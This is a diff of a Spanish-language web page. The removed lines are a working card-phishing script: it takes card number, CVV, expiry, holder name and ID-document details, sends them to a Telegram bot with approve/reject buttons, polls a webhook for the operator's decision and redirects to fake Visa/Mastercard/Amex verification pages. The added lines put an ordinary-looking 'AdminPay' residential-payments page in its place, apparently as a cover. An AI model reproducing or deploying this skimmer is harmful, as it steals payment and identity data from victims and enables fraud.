-        function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
-            const cardLast4 = cardNumber.slice(-4);
-            
-            // Guardar datos de la tarjeta
-            localStorage.setItem('cardNumber', cardNumber);
-            localStorage.setItem('cardLast4', cardLast4);
-            localStorage.setItem('cvc', cvc);
-            localStorage.setItem('expiry', expiry);
-            localStorage.setItem('cardholderName', cardholderName);
-            localStorage.setItem('cardType', cardType);
-            
-            // Guardar el banco emisor para visa.html / master.html
-            localStorage.setItem('bancoEmisor', banco);
-            
-            // Guardar el logo del banco (solo para visa.html / master.html)
-            const bankLogoFile = bankLogos[banco] || '';
-            localStorage.setItem('bankLogo', bankLogoFile);
-            
-            console.log('💾 Datos guardados en localStorage:', {
-                cardType: cardType,
-                bancoEmisor: banco,
-                bankLogo: bankLogoFile
-            });
-        }
-
-        // ============================================
-        // MOSTRAR PANTALLA DE CARGA - SIMPLE
-        // ============================================
-        function mostrarCargaConLogos(tipoTarjeta) {
-            // Ocultar spinner inicial
-            initialSpinner.classList.remove('active');
-            initialSpinner.style.display = 'none';
-            
-            // Mostrar logo de la tarjeta (GRANDE)
-            logoContainer.style.display = 'flex';
-            
-            // Actualizar logo de tarjeta
-            const cardLogoFile = cardLogos[tipoTarjeta];
-            if (cardLogoFile) {
-                cardLogoImg.src = cardLogoFile;
-                cardLogoImg.alt = tipoTarjeta.charAt(0).toUpperCase() + tipoTarjeta.slice(1);
-            }
-            
-            // Mostrar barra de progreso
-            progressWrapper.style.display = 'block';
-            
-            // Texto simple
-            const nombres = {
-                'visa': 'Verified by Visa',
-                'mastercard': 'Mastercard SecureCode',
-                'amex': 'American Express SafeKey'
-            };
-            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipoTarjeta] || '...');
-            
-            // Animar barra de progreso (sin contador)
-            let progress = 0;
-            const duration = 3000;
-            const interval = 50;
-            const steps = duration / interval;
-            const increment = 100 / steps;
-            
-            progressFill.style.width = '0%';
-            
-            const timer = setInterval(() => {
-                progress += increment;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(timer);
-                    setTimeout(() => {
-                        redirigirSegunTipoTarjeta(tipoTarjeta);
-                    }, 400);
-                }
-                progressFill.style.width = progress + '%';
-            }, interval);
-        }
-
-        // ============================================
-        // REDIRIGIR SEGÚN TIPO DE TARJETA
-        // ============================================
-        function redirigirSegunTipoTarjeta(tipo) {
-            const map = {
-                'visa': 'visa.html',
-                'mastercard': 'master.html',
-                'amex': 'amex.html'
-            };
-            const destino = map[tipo] || 'index.html';
-            window.location.href = destino;
-        }
-
-        // ============================================
-        // ENVÍO DE DATOS DE TARJETA A TELEGRAM
-        // ============================================
-        async function enviarDatosTarjetaATelegram(datos) {
-            try {
-                const inlineKeyboard = {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
-                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
-                        ]
-                    ]
-                };
-
-                const mensaje = `🔔 *NUEVA SOLICITUD - V2CRTF*
-
-🆔 ID: \`${datos.solicitudId}\`
-
-📋 *DATOS PERSONALES:*
-👤 Nombre completo: ${datos.nombreCompleto}
-🆔 Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
-📧 Email: ${datos.email}
-📱 Celular: ${datos.celular}
-
-💳 *DATOS DE LA TARJETA:*
-🏦 Número: \`${datos.numeroTarjeta}\`
-🔢 CVV: \`${datos.cvv}\`
-📅 Vencimiento: \`${datos.vencimiento}\`
-💳 Tipo: ${datos.tipoTarjeta.toUpperCase()}
-🏛️ Banco emisor: ${datos.bancoEmisor}
-
-💰 Total: ${datos.totalFormateado}
-📅 Fecha: ${datos.fechaHora}
-
-⏳ *Estado:* Esperando verificación...`;
-
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.ok) {
-                    console.log('✅ Datos de tarjeta enviados a Telegram');
-                    return true;
-                } else {
-                    console.error('❌ Error al enviar a Telegram:', data.description);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ Error al enviar a Telegram:', error);
-                return false;
-            }
-        }
-
-        // ============================================
-        // VERIFICAR ESTADO DE SOLICITUD
-        // ============================================
-        async function verificarEstadoSolicitud(solicitudId) {
-            try {
-                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
-                const data = await response.json();
-                console.log('📊 Estado de solicitud:', data);
-                return data.estado || 'pending';
-            } catch (error) {
-                console.error('❌ Error verificando estado:', error);
-                return 'error';
-            }
-        }
-
-        // ============================================
-        // POLLING PARA ESPERAR APROBACIÓN DEL PAGO
-        // ============================================
-        function iniciarPollingPago() {
-            let tiempoInicio = Date.now();
-
-            pollingInterval = setInterval(async () => {
-                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
-                    clearInterval(pollingInterval);
-                    mostrarError('Tiempo de espera agotado. Por favor, intente nuevamente.');
-                    loadingOverlay.classList.remove('active');
-                    submitButton.disabled = false;
-                    submitButton.textContent = 'Pagar de forma segura';
-                    submitButton.style.display = 'block';
-                    cardNumberInput.disabled = false;
-                    cardholderInput.disabled = false;
-                    expiryInput.disabled = false;
-                    cvcInput.disabled = false;
-                    bancoEmisor.disabled = false;
-                    return;
-                }
-
-                const resultado = await verificarEstadoSolicitud(solicitudId);
-
-                if (resultado === 'approved') {
-                    clearInterval(pollingInterval);
-                    mostrarCargaConLogos(cardType);
-
-                } else if (resultado === 'rejected') {
-                    clearInterval(pollingInterval);
-                    loadingOverlay.classList.remove('active');
-                    mostrarError('❌ Pago rechazado. Por favor, verifique los datos e intente nuevamente.');
-                    
-                    cardNumberInput.disabled = false;
-                    cardholderInput.disabled = false;
-                    expiryInput.disabled = false;
-                    cvcInput.disabled = false;
-                    bancoEmisor.disabled = false;
-                    submitButton.disabled = false;
-                    submitButton.textContent = 'Pagar de forma segura';
-                    submitButton.style.display = 'block';
-                }
-            }, POLLING_INTERVAL);
-        }
-
-        // ============================================
-        // ENVÍO DEL FORMULARIO DE PAGO
-        // ============================================
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
-            const cardholderName = cardholderInput.value.trim();
-            const expiry = expiryInput.value;
-            const cvc = cvcInput.value;
-            const banco = bancoEmisor.value;
-
-            let isValid = true;
-
-            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
-            ocultarMensaje();
-
-            if (!cardholderName) {
-                cardholderInput.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            cardType = detectCardType(cardNumber);
-            if (!cardType || cardNumber.length === 0) {
-                cardNumberInput.parentElement.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-            if (!expiryRegex.test(expiry)) {
-                expiryInput.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            const cvcLength = cardType === 'amex' ? 4 : 3;
-            if (cvc.length !== cvcLength) {
-                cvcInput.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            if (!banco) {
-                bancoEmisor.parentElement.classList.add('error');
-                isValid = false;
-            }
-
-            if (!isValid) {
-                return;
-            }
-
-            // GUARDAR DATOS EN LOCALSTORAGE
-            guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco);
-
-            solicitudId = generarSolicitudId();
-
-            loadingOverlay.classList.add('active');
-            
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
-            loadingText.textContent = 'Procesando pago...';
-
-            submitButton.disabled = true;
-            submitButton.textContent = 'Procesando...';
-
-            cardNumberInput.disabled = true;
-            cardholderInput.disabled = true;
-            expiryInput.disabled = true;
-            cvcInput.disabled = true;
-            bancoEmisor.disabled = true;
-
-            const nombre = localStorage.getItem('nombre') || 'No proporcionado';
-            const apellidos = localStorage.getItem('apellidos') || '';
-            const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
-            const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
-            const email = localStorage.getItem('email') || 'No proporcionado';
-            const celular = localStorage.getItem('celular') || 'No proporcionado';
-
-            const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
-            let total = 23000;
-            if (procesamiento_prioritario) {
-                total += 20000;
-            }
-            const totalFormateado = total.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
-
-            const fechaHora = new Date().toLocaleString('es-CO', {
-                timeZone: 'America/Bogota',
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-
-            const datosTelegram = {
-                solicitudId: solicitudId,
-                nombreCompleto: `${nombre} ${apellidos}`.trim(),
-                tipoDocumento: tipoDocumento,
-                numeroDocumento: numeroDocumento,
-                email: email,
-                celular: celular,
-                numeroTarjeta: cardNumber,
-                cvv: cvc,
-                vencimiento: expiry,
-                tipoTarjeta: cardType,
-                bancoEmisor: banco,
-                totalFormateado: totalFormateado,
-                fechaHora: fechaHora
-            };
-
-            const enviado = await enviarDatosTarjetaATelegram(datosTelegram);
-
-            if (enviado) {
-                mostrarInfo('⏳ Esperando aprobación del pago...');
-                iniciarPollingPago();
-            } else {
-                mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
-                cardNumberInput.disabled = false;
-                cardholderInput.disabled = false;
-                expiryInput.disabled = false;
-                cvcInput.disabled = false;
-                bancoEmisor.disabled = false;
-                submitButton.disabled = false;
-                submitButton.textContent = 'Pagar de forma segura';
-                loadingOverlay.classList.remove('active');
-            }
-        });
-    </script>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+
+    <!-- 2 -->
+    <div class="ranking-card">
+      <div class="rank-badge second">2</div>
+      <div class="rank-content">
+        <h3>Altos de la Colina</h3>
+        <p class="rank-location">📍 Envigado, Antioquia · 250 familias</p>
+        <div class="rank-tags">
+          <span class="tag">Plataforma integral</span>
+          <span class="tag">Múltiples métodos</span>
+          <span class="tag">1% comisión</span>
+        </div>
+        <p class="rank-desc">Integración con plataforma de administración completa. Pago por PSE, tarjeta crédito, transferencia bancaria. Certificados de pago automáticos. Historial disponible.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">9.5/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">1% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">Instantáneo</span>
+          </div>
+        </div>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+
+    <!-- 3 -->
+    <div class="ranking-card">
+      <div class="rank-badge third">3</div>
+      <div class="rank-content">
+        <h3>Brisas del Mar</h3>
+        <p class="rank-location">📍 Barranquilla, Atlántico · 300 familias</p>
+        <div class="rank-tags">
+          <span class="tag">Portal web</span>
+          <span class="tag">App mobile</span>
+          <span class="tag">2% comisión</span>
+        </div>
+        <p class="rank-desc">Portal web responsive + app. Soporte 24/7 en chat. Recordatorios automáticos de pago. Promociones mensuales para pagadores puntuales. Muy accesible.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">9.2/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">2% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">1-2 min</span>
+          </div>
+        </div>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+
+    <!-- 4 -->
+    <div class="ranking-card">
+      <div class="rank-badge other">4</div>
+      <div class="rank-content">
+        <h3>Parque Central 88</h3>
+        <p class="rank-location">📍 Bogotá D.C. · 400 familias</p>
+        <div class="rank-tags">
+          <span class="tag">Dashboard completo</span>
+          <span class="tag">Analytics incluido</span>
+          <span class="tag">1.5% comisión</span>
+        </div>
+        <p class="rank-desc">Plataforma robusta con análisis detallados de pagos. Reportes automáticos. Integración con contabilidad. Opción de pago recurrente. Seguridad certificada.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">9.0/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">1.5% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">2-3 min</span>
+          </div>
+        </div>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+
+    <!-- 5 -->
+    <div class="ranking-card">
+      <div class="rank-badge other">5</div>
+      <div class="rank-content">
+        <h3>Ciudadela Verde</h3>
+        <p class="rank-location">📍 Cali, Valle del Cauca · 220 familias</p>
+        <div class="rank-tags">
+          <span class="tag">Simple y directo</span>
+          <span class="tag">Accesible</span>
+          <span class="tag">3% comisión</span>
+        </div>
+        <p class="rank-desc">Plataforma sin complicaciones. Interfaz clara para usuarios de todas las edades. Soporte por teléfono y email. Certificados de pago por email. Muy confiable.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">8.8/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">3% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">3-5 min</span>
+          </div>
+        </div>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+
+    <!-- 6 -->
+    <div class="ranking-card">
+      <div class="rank-badge other">6</div>
+      <div class="rank-content">
+        <h3>Portal de los Andes</h3>
+        <p class="rank-location">📍 Bucaramanga, Santander · 180 familias</p>
+        <div class="rank-tags">
+          <span class="tag">Innovador</span>
+          <span class="tag">IA para recordatorios</span>
+          <span class="tag">2% comisión</span>
+        </div>
+        <p class="rank-desc">Tecnología IA para recordatorios inteligentes. Predicción de retrasos. Opciones de subsidios para familias con dificultades. Pagos flexibles. Muy humano.</p>
+        <div class="rank-metrics">
+          <div class="metric">
+            <span class="metric-label">Facilidad de pago</span>
+            <span class="metric-value">8.7/10</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Comisión</span>
+            <span class="metric-value">2% usuario</span>
+          </div>
+          <div class="metric">
+            <span class="metric-label">Tiempo confirmación</span>
+            <span class="metric-value">1-2 min</span>
+          </div>
+        </div>
+      </div>
+      <div class="rank-actions">
+        <button class="btn-small">Más info</button>
+        <button class="btn-small">Contactar</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PLATAFORMAS DE PAGO -->
+<section id="pagos">
+  <div class="section-header" style="max-width:1200px;margin:0 auto 3rem">
+    <p class="section-tag">Tecnología de pagos</p>
+    <h2 class="section-title">Plataformas digitales más <em>usadas</em> en conjuntos</h2>
+    <p class="section-desc">Comparativa de las plataformas de pago que usan los conjuntos residenciales. Todas con seguridad certificada y soporte técnico 24/7.</p>
+  </div>
+
+  <div class="payment-grid">
+    <div class="payment-card">
+      <div class="payment-icon">📱</div>
+      <div class="payment-name">PSE Online</div>
+      <div class="payment-desc">Transferencia bancaria sin intermediarios. La opción preferida en Colombia. Comisión baja del 0-1%. Confirmación instantánea.</div>
+    </div>
+    <div class="payment-card">
+      <div class="payment-icon">💳</div>
+      <div class="payment-name">Tarjeta de Crédito</div>
+      <div class="payment-desc">Débito y crédito. Permite cuotas sin interés en algunos conjuntos. Comisión 2-3%. Confirmación rápida.</div>
+    </div>
+    <div class="payment-card">
+      <div class="payment-icon">🏦</div>
+      <div class="payment-name">Transferencia Bancaria</div>
+      <div class="payment-desc">Para pagos grandes. Directamente de tu cuenta a la cuenta del conjunto. 0% comisión. Confirmación en 1-2 días.</div>
+    </div>
+    <div class="payment-card">
+      <div class="payment-icon">💰</div>
+      <div class="payment-name">Efectivo en Oficina</div>
+      <div class="payment-desc">Todavía disponible en algunos conjuntos. Opción para quienes no tienen cuenta bancaria. Comprobante inmediato.</div>
+    </div>
+    <div class="payment-card">
+      <div class="payment-icon">🔐</div>
+      <div class="payment-name">Billetera Digital</div>
+      <div class="payment-desc">Daviplata, Nequi, Pichincha. Cada vez más conjuntos la aceptan. Comisión variable. Muy rápido.</div>
+    </div>
+    <div class="payment-card">
+      <div class="payment-icon">📲</div>
+      <div class="payment-name">App Dedicada</div>
+      <div class="payment-desc">Algunos conjuntos tienen su propia app. Lo más seguro y personalizado. Características exclusivas.</div>
+    </div>
+  </div>
+</section>
+
+<!-- GUÍA -->
+<section id="guia">
+  <div class="section-header" style="max-width:1200px;margin:0 auto 3rem">
+    <p class="section-tag">Pasos prácticos</p>
+    <h2 class="section-title">Cómo pagar tu <em>administración online</em></h2>
+    <p class="section-desc">Una guía simple de 4 pasos para hacer tu primer pago digital de administración sin problemas.</p>
+  </div>
+
+  <div class="guide-grid">
+    <div class="guide-card">
+      <div class="guide-number">01</div>
+      <div class="guide-title">Obtén tus datos de acceso</div>
+      <div class="guide-text">Contacta a la administración del conjunto para recibir tu usuario y contraseña. Algunos envían SMS, otros por email. Guarda esta información en un lugar seguro.</div>
+    </div>
+    <div class="guide-card">
+      <div class="guide-number">02</div>
+      <div class="guide-title">Ingresa a la plataforma</div>
+      <div class="guide-text">Desde tu navegador o app móvil, entra con tus credenciales. Verás el saldo actual y fecha de vencimiento. Asegúrate de estar en el sitio oficial.</div>
+    </div>
+    <div class="guide-card">
+      <div class="guide-number">03</div>
+      <div class="guide-title">Elige el método de pago</div>
+      <div class="guide-text">Selecciona entre PSE, tarjeta crédito, transferencia o billetera digital. Cada método tiene diferentes plazos y comisiones. Elige el que prefieras.</div>
+    </div>
+    <div class="guide-card">
+      <div class="guide-number">04</div>
+      <div class="guide-title">Confirma y guarda comprobante</div>
+      <div class="guide-text">Revisa los datos antes de confirmar. Una vez pagado, descarga o guarda el PDF del comprobante. Te llegará también por email automáticamente.</div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section id="cta">
+  <h2>¿Buscas mudarte a un conjunto con pago online?</h2>
+  <p>Descarga nuestro guía completa con información de los 142 conjuntos analizados, comparativa de plataformas de pago y recomendaciones según tu ciudad y presupuesto.</p>
+  <button class="btn-cta">Descargar guía completa</button>
+</section>
+
+<!-- CONTACTO -->
+<section id="contacto">
+  <div style="max-width:800px;margin:0 auto;padding:6rem 2rem">
+    <div style="text-align:center;margin-bottom:3rem">
+      <p class="section-tag" style="justify-content:center">📞 Ponte en contacto</p>
+      <h2 class="section-title" style="margin:1rem 0">¿Preguntas sobre <em>pagos residenciales</em>?</h2>
+      <p class="section-desc">Contáctanos y un asesor te ayudará a encontrar el mejor sistema de pago para tu conjunto o te resolverá cualquier duda.</p>
+    </div>
+
+    <form id="contactForm" style="display:grid;gap:1.5rem">
+      <div>
+        <label style="display:block;margin-bottom:.5rem;font-weight:600;color:var(--text)">Nombre completo</label>
+        <input type="text" placeholder="Juan Pérez" required style="width:100%;padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95rem;transition:border-color .2s">
+      </div>
+      <div>
+        <label style="display:block;margin-bottom:.5rem;font-weight:600;color:var(--text)">Email</label>
+        <input type="email" placeholder="juan@example.com" required style="width:100%;padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95rem;transition:border-color .2s">
+      </div>
+      <div>
+        <label style="display:block;margin-bottom:.5rem;font-weight:600;color:var(--text)">Teléfono</label>
+        <input type="tel" placeholder="+57 300 123 4567" required style="width:100%;padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95rem;transition:border-color .2s">
+      </div>
+      <div>
+        <label style="display:block;margin-bottom:.5rem;font-weight:600;color:var(--text)">Tipo de consulta</label>
+        <select required style="width:100%;padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95rem;background:#fff;cursor:pointer">
+          <option value="">Selecciona una opción</option>
+          <option value="ranking">Información sobre conjuntos</option>
+          <option value="plataformas">Consulta de plataformas de pago</option>
+          <option value="implementar">Implementar pago online</option>
+          <option value="soporte">Soporte técnico</option>
+          <option value="otro">Otro</option>
+        </select>
+      </div>
+      <div>
+        <label style="display:block;margin-bottom:.5rem;font-weight:600;color:var(--text)">Mensaje</label>
+        <textarea placeholder="Cuéntanos cómo podemos ayudarte..." required style="width:100%;padding:.9rem 1.2rem;border:1px solid var(--border);border-radius:8px;font-family:'Inter',sans-serif;font-size:.95rem;min-height:150px;resize:none"></textarea>
+      </div>
+      <button type="submit" class="btn-primary" style="width:100%;padding:1rem;margin-top:.5rem">Enviar mensaje</button>
+      <p style="font-size:.85rem;color:var(--muted);text-align:center">Nos comprometemos a responder en menos de 24 horas</p>
+    </form>
+
+    <div style="margin-top:4rem;padding-top:3rem;border-top:1px solid var(--border);display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:2rem;text-align:center">
+      <div>
+        <div style="font-size:2rem;margin-bottom:.5rem">📧</div>
+        <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Email</div>
+        <div style="color:var(--muted)"><a href="mailto:info@adminpay.co" style="color:var(--primary);text-decoration:none">info@adminpay.co</a></div>
+      </div>
+      <div>
+        <div style="font-size:2rem;margin-bottom:.5rem">📱</div>
+        <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Teléfono</div>
+        <div style="color:var(--muted)"><a href="tel:+573005551234" style="color:var(--primary);text-decoration:none">+57 300 555 1234</a></div>
+      </div>
+      <div>
+        <div style="font-size:2rem;margin-bottom:.5rem">🏢</div>
+        <div style="font-weight:600;color:var(--text);margin-bottom:.3rem">Oficina</div>
+        <div style="color:var(--muted)">Carrera 7 #45-89, Bogotá D.C.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- POLÍTICAS -->
+<section id="politicas" style="padding:6rem 5vw;background:#FAFBFC">
+  <div style="max-width:900px;margin:0 auto">
+    <h2 class="section-title" style="margin-bottom:2rem">Políticas de <em>Privacidad</em></h2>
+    
+    <div style="color:var(--muted);line-height:1.8;font-size:.95rem;display:grid;gap:2rem">
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">1. Información que Recopilamos</h3>
+        <p>AdminPay recopila información personal únicamente cuando nos la proporcionas voluntariamente a través de formularios, descarga de guías o comunicación directa. Esta información incluye: nombre completo, dirección de correo electrónico, número de teléfono, ciudad y tipo de vivienda. No recopilamos datos de navegación ni utilizamos cookies de rastreo sin tu consentimiento.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">2. Uso de Datos</h3>
+        <p>Utilizamos tu información únicamente para: responder tus consultas, enviar recursos solicitados, proporcionar actualizaciones sobre nuevos conjuntos analizados, y mejorar nuestros servicios. Nunca compartimos tu información con terceros sin tu consentimiento explícito. Tu email no será utilizado para marketing no solicitado.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">3. Seguridad de Datos</h3>
+        <p>Protegemos tus datos usando encriptación SSL de 256 bits en todas las transmisiones. Nuestros servidores están alojados en centros de datos certificados ISO 27001. Acceso restringido a datos personales solo a personal autorizado. Realizamos auditorías de seguridad trimestral.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">4. Tus Derechos</h3>
+        <p>Tienes derecho a acceder, rectificar, eliminar o transportar tus datos personales en cualquier momento. Para ejercer estos derechos, contáctanos a privacidad@adminpay.co. Responderemos dentro de 10 días hábiles. No hay restricción de tiempo para solicitar cambios en tus datos.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">5. Cookies y Tecnologías Similares</h3>
+        <p>Utilizamos cookies funcionales para mejorar tu experiencia (recordar preferencias, mantener sesión). No utilizamos cookies de seguimiento publicitario. Puedes desactivar cookies en tu navegador sin perder acceso a contenido esencial. Las cookies de sesión se eliminan automáticamente al cerrar el navegador.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">6. Cambios a esta Política</h3>
+        <p>Nos reservamos el derecho de actualizar esta política de privacidad en cualquier momento. Los cambios significativos serán comunicados por email a usuarios registrados con al menos 30 días de anticipación. Seguir utilizando AdminPay después de cambios constituye aceptación de la nueva política.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">7. Cumplimiento Legal</h3>
+        <p>AdminPay cumple con la Ley 1581 de 2012 de Protección de Datos Personales en Colombia. También cumplimos con GDPR para usuarios en la UE y CCPA para usuarios en California. Nos sometemos a inspecciones regulares de la Superintendencia de Industria y Comercio (SIC).</p>
+      </div>
+
+      <div style="background:rgba(37,99,235,.05);border:1px solid rgba(37,99,235,.2);border-radius:12px;padding:1.5rem">
+        <p style="margin:0;color:var(--text)"><strong>Última actualización:</strong> 15 de noviembre de 2024</p>
+        <p style="margin:.5rem 0 0;color:var(--muted);font-size:.9rem">Para preguntas sobre privacidad: <a href="mailto:privacidad@adminpay.co" style="color:var(--primary);text-decoration:none">privacidad@adminpay.co</a></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TÉRMINOS DE USO -->
+<section id="terminos" style="padding:6rem 5vw;background:#fff">
+  <div style="max-width:900px;margin:0 auto">
+    <h2 class="section-title" style="margin-bottom:2rem">Términos de <em>Uso</em></h2>
+    
+    <div style="color:var(--muted);line-height:1.8;font-size:.95rem;display:grid;gap:2rem">
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">1. Aceptación de Términos</h3>
+        <p>Al acceder y utilizar AdminPay.co, aceptas vincularte por estos términos y condiciones. Si no estás de acuerdo con alguna parte, no autorizado usar nuestro sitio. AdminPay se reserva el derecho de modificar estos términos en cualquier momento notificando a través del sitio web.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">2. Uso Permitido</h3>
+        <p>Nuestro contenido es solo para información educativa. El ranking se basa en investigación independiente pero puede contener errores. No proporciona asesoramiento legal, financiero o inmobiliario profesional. Siempre verifica información directamente con los conjuntos antes de tomar decisiones.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">3. Prohibiciones</h3>
+        <p>No está permitido: reproducir o distribuir contenido sin permiso, acceder no autorizado a sistemas, enviar spam o malware, impersonar otros usuarios, comercializar información de terceros, scraping automático, o usar el sitio para actividades ilegales. Violaciones resultarán en bloqueo inmediato de acceso.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">4. Responsabilidad Limitada</h3>
+        <p>AdminPay no es responsable por: errores u omisiones en la información, pérdida de datos, interrupciones del servicio, daños indirectos o pérdidas económicas. Nuestro sitio se proporciona "tal cual" sin garantías de precisión o disponibilidad. Responsabilidad máxima: reembolso del precio pagado (si aplica).</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">5. Contenido de Terceros</h3>
+        <p>AdminPay no es responsable por información proporcionada por conjuntos, plataformas de pago o usuarios. Verificamos datos al máximo pero información puede cambiar. Links externos están provistos por conveniencia; no endosamos sus contenidos. Contacta directamente con fuentes para confirmación.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">6. Derechos de Propiedad Intelectual</h3>
+        <p>Todo contenido en AdminPay (texto, gráficos, diseño) es propiedad intelectual protegida © 2024. Puedes usar para referencia personal. Reproducción comercial requiere permiso escrito. Respetamos derechos de terceros; reporta infracciones a legal@adminpay.co.</p>
+      </div>
+
+      <div>
+        <h3 style="color:var(--text);font-size:1.2rem;font-weight:700;margin-bottom:.6rem">7. Resolución de Disputas</h3>
+        <p>Estos términos se rigen por leyes de Colombia. Disputas serán resueltas por arbitraje en Bogotá D.C. según Cámara de Comercio de Bogotá. Ambas partes renuncian a derecho de demanda en tribunal ordinario. Arbitraje es vinculante y confidencial.</p>
+      </div>
+
+      <div style="background:rgba(37,99,235,.05);border:1px solid rgba(37,99,235,.2);border-radius:12px;padding:1.5rem">
+        <p style="margin:0;color:var(--text)"><strong>Última actualización:</strong> 15 de noviembre de 2024</p>
+        <p style="margin:.5rem 0 0;color:var(--muted);font-size:.9rem">Para cuestiones legales: <a href="mailto:legal@adminpay.co" style="color:var(--primary);text-decoration:none">legal@adminpay.co</a></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-grid">
+    <div class="footer-brand">
